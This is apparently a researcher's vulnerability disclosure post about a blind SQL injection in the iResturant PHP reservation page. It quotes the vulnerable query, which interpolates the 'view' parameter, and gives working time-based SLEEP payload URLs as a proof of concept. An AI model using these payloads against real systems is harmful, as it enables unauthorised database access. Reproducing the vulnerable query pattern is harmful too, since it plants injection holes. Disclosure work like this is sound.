---
layout: post
date: 2021-12-21 21:20:00
title: "Blind SQL Injection in MartDevelopers-Inc/iResturant (2)"
categories: Research
tags: [SQL Injection]
author:
  - Jeongwon Jo

---
## Summary

> The [iResturant](https://github.com/MartDevelopers-Inc/iResturant) is open source for web commercial use. When looking up my reservation, SQL Injection occurs because the value of the view parameter is not checked.

```php
/* (...) */
        <!-- Top Bar Start -->
        <?php require_once('../partials/my_header.php');
        /* Load Room Details */
        $ret = "SELECT * FROM `iResturant_Currencies` WHERE status = 'Active'  ";
        $stmt = $mysqli->prepare($ret);
        $stmt->execute(); //ok
        $res = $stmt->get_result();
        while ($currency = $res->fetch_object()) {
            $view = $_GET['view'];
            $ret = "SELECT * FROM iResturant_Customer c
            INNER JOIN iResturant_Room_Reservation r ON c.id = r.client_id
            INNER JOIN iResturant_Room rm
            ON r.room_id = rm.id
            WHERE r.code = '$view'                                                     
                ";
            $stmt = $mysqli->prepare($ret);
            $stmt->execute(); //ok
            $res = $stmt->get_result();
            while ($reservation = $res->fetch_object()) 
/* (...) */
// https://github.com/MartDevelopers-Inc/iResturant/blob/main/views/my_reservation_details.php#L41L57
```
The code above is the code of my reservation inquiry logic. If you look at the code of the reservation inquiry logic, you can see that it gets the view parameter values and puts them in SQL Query. This causes SQL Injection because are not using Prepared Statement.

![](https://github.com/blogpocas/DATA/blob/main/BB/iResturant/SQL%20Injection%202/1.png?raw=true)
```txt
http://cloud.pocas.kr/iResturant/views/my_reservation_details.php?view=%27or%20sleep(5)%23
```
If you connect to the URL above after logging in, you can see that the Sleep phenomenon occurs for about 25 seconds. It can leak server information by using Blind SQL Injection technique!

---
## Proof of Concept

```txt
1. Open the http://<hostname>/iResturant/views/my_login.php
2. After Login, go to http://<hostname>/iResturant/views/my_reservation_details.php?view=a%27%20AND%20(SELECT%208666%20FROM%20(SELECT(SLEEP(5)))hhmy)%20AND%20%27ROfB%27=%27ROfB
```
<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls preload>
    <source src="https://github.com/blogpocas/DATA/blob/main/BB/iResturant/SQL%20Injection%202/sql.mov?raw=true" type="video/mp4">
</video>

---
## Reporting Timeline

- 2021-12-21 21h 39m : Reported this issue via the [MITRE](https://cve.mitre.org/)

---